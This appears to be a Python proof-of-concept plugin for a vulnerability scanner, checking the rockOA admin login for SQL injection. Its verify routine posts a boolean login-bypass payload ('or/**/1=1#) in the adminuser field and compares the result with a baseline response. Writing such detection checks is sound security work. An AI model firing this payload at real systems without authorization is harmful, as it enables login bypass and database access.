# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'rockOA_0002' # 平台漏洞编号，留空
    name = 'rockOA SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        rockOA 管理员登陆的地址没有过滤，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'rockOA'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'd7ec0f03-87e1-4625-b305-622d29ed3418'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            url = self.target + "/rock.php?a=check&m=login&d=&ajaxbool=true&rnd=0.03643321571871638"
            data1 = "adminuser=&adminpass=999&rempass=0&button=+%E7%99%BB+%E5%BD%95+&jmpass=false"
            code1, head1, res1, errcode1, finalurl1 = hh.http(url, post=data1)

            data2 = "adminuser='or/**/1=1%23&adminpass=999&rempass=0&button=+%E7%99%BB+%E5%BD%95+&jmpass=false"
            code2, head2, res2, errcode2, finalurl2 = hh.http(url, post=data2)

            if code1 == 200 and code2 == 200 and  res1 != res2: 
                #security_hole('bool base sql inject :'+url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
